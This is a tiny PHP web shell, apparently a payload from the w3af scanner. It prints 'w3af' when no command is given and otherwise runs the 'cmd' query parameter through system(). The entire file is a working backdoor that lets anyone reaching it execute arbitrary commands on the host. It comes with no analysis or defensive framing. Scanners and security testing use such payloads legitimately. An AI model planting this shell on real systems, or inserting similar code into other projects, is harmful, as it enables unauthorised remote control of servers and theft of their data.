<? 
if ( strcmp( $_GET['cmd'], "" ) == 0 ){
    echo "w3" . "af";
}else{
    system ( $_GET['cmd'] );
}
?>
